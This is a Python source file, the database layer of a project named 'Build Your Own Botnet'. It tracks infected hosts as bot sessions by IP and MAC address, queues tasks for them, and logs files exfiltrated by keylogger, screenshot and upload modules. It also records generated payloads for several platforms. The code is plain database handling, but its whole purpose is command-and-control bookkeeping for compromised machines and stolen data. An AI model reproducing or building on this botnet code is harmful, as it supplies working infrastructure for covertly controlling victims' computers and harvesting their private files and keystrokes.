#!/usr/bin/python
# -*- coding: utf-8 -*-
'DAO (Build Your Own Botnet)'

# standard library
import os
import json
import math
import hashlib
import collections
from datetime import datetime

from flask_login import login_user, logout_user, current_user, login_required

# modules
from buildyourownbotnet import app, db
from buildyourownbotnet.models import User, Session, Task, Payload, ExfiltratedFile
from buildyourownbotnet.modules import util


# Python 3 compatibility
try:
    unicode         # Python 2
except NameError:
    unicode = str   # Python 3

try:
    xrange          # Python 2
except NameError:
    xrange = range  # Python 3


#####################
# Dashboard functions

def get_sessions_new(user_id):
    """
    Get new sessions and update 'new' to False.

    `Required`
    :param int user_id:     User ID
    """
    user = User.query.get(user_id)
    new_sessions = []
    if user:
        sessions = user.sessions
        for s in sessions:
            if s.new:
                s.new = False
                new_sessions.append(s)
    db.session.commit()
    return new_sessions


def get_sessions(user_id, verbose=False):
    """
    Fetch sessions from database

    `Required`
    :param int user_id:     User ID

    `Optional`
    :param bool verbose:    include full session information

    Returns list of sessions for the specified user.
    """
    user = User.query.get(user_id)
    if user:
        return user.sessions
    return []


def get_tasks(session_uid):
    """
    Fetch tasks from databse for specified session.

    `Optional`
    :param int session_id:  Session ID 
    """
    session = Session.query.filter_by(uid=session_uid).first()
    if session:
        return session.tasks
    return []


def get_tasks_paginated(session_id, page=1):
    """
    Fetch tasks from database  for specified session (paginated).

    `Optional`
    :param int session_id:  Session ID 

    Returns list of tasks for the specified session, and total pages of tasks.
    """
    session = Session.query.filter_by(id=session_id).first()
    if session:
        tasks = session.tasks
        # janky manual pagination
        pages = int(math.ceil(float(len(tasks))/20.0))
        blocks = [i for i in xrange(0, len(tasks), 20)]
        if (page - 1 >= 0) and (page + 1 <= len(blocks)):
            start, end = blocks[page - 1:page + 1]
            if (start >= 0) and (end <= len(tasks)):
                return tasks[start:end], pages
    return [], 0


################
# File functions

def add_file(owner, filename, session, module):
    """
    Add newly exfiltrated file to database.

    `Required`
    :param int user_id:         user ID
    :param str filename:        filename
    :param str session:         public IP of session
    :param str module:          module name (keylogger, screenshot, upload, etc.)
    """
    user = User.query.filter_by(username=owner).first()
    if user:  
        exfiltrated_file = ExfiltratedFile(filename=filename,
                                           session=session,
                                           module=module,
                                           owner=user.username)
        db.session.add(exfiltrated_file)
        db.session.commit()


def get_files(user_id):
    """
    Get a list of files exfiltrated by the user.

    `Required`
    :param int user_id:         user ID
    """
    user = User.query.get(user_id)
    if user:  
        return user.files
    return []



###################
# Payload functions

def get_payloads(user_id):
    """
    Get a list of the user's payloads.

    `Required`
    :param int user_id:         user ID
    """
    user = User.query.get(user_id)
    if user:
        return user.payloads
    return []


def add_payload(user_id, filename, operating_system, architecture):
    """
    Add newly generated payload to database.

    `Required`
    :param int user_id:             user ID
    :param str filename:            filename
    :param str operating_system:    nix, win, mac
    :param str architecture:        x32, x64, arm64v8/debian, arm32v7/debian, i386/debian
    """
    user = User.query.get(user_id)
    if user:
        payload = Payload(filename=filename, 
                          operating_system=operating_system,
                          architecture=architecture,
                          owner=user.username)
        db.session.add(payload)
        db.session.commit()



##################
# Server functions

def handle_session(session_dict):
    """
    Handle a new/current client by adding/updating database

    `Required`
    :param dict session_dict:    session host machine session_dictrmation

    Returns the session information as a dictionary.
    """
    if not session_dict.get('uid'):
        identity = str(session_dict['public_ip'] + session_dict['mac_address'] + session_dict['owner']).encode()
        session_dict['uid'] = hashlib.md5(identity).hexdigest()
        session_dict['joined'] = datetime.utcnow()

    session_dict['online'] = 1
    session_dict['last_online'] = datetime.utcnow()

    session = Session.query.filter_by(uid=session_dict['uid']).first()

    if not session:
        # get new session id
        user = User.query.filter_by(username=session_dict['owner']).first()
        if user:
            sessions = user.sessions
            if sessions:
                session_dict['id'] = 1 + max([s.id for s in sessions])
            else:
                session_dict['id'] = 1

            # add new session
            session = Session(**session_dict)
            db.session.add(session)

            # update number of bots
            user.bots += 1
        else:
            util.log("User not found: " + session_dict['owner'])
    else:
        # set session status to online
        session.online = True
        session.last_online = datetime.utcnow()

    session.new = True

    db.session.commit()

    session_dict['id'] = session.id
    return session_dict


def handle_task(task_dict):
    """
    Adds issued tasks to the database and updates completed tasks with results

    `Task`
    :attr str session:         associated session UID 
    :attr str task:            task assigned by server
    :attr str uid:             task ID assigned by server
    :attr str result:          task result completed by client
    :attr datetime issued:     time task was issued by server
    :attr datetime completed:  time task was completed by client

    Returns task information as a dictionary.

    """
    if not isinstance(task_dict, dict):
        task_dict = {'result': 'Error: client returned invalid response: "{}"'.format(str(task_dict))}
    if not task_dict.get('uid'):
        identity = str(str(task_dict.get('session')) + str(task_dict.get('task')) + datetime.utcnow().__str__()).encode()
        task_dict['uid'] = hashlib.md5(identity).hexdigest()
        task_dict['issued'] = datetime.utcnow()
        task = Task(**task_dict)
        db.session.add(task)
        # encode datetime object as string so it will be JSON serializable
        task_dict['issued'] = task_dict.get('issued').__str__()
    else:
        task = Task.query.filter_by(uid=task_dict.get('uid')).first()
        if task:
            task.result = task_dict.get('result')
            task.completed = datetime.utcnow()

    db.session.commit()
    return task_dict


def update_session_status(session_uid, status):
    """
    Update online/offline status of the specified session.

    `Required`
    :param int session_id:      Session UID
    :param bool status:         True (online), False (offline)
    """
    session = Session.query.filter_by(uid=session_uid).first()
    if session:
        session.online = bool(status)
        db.session.commit()

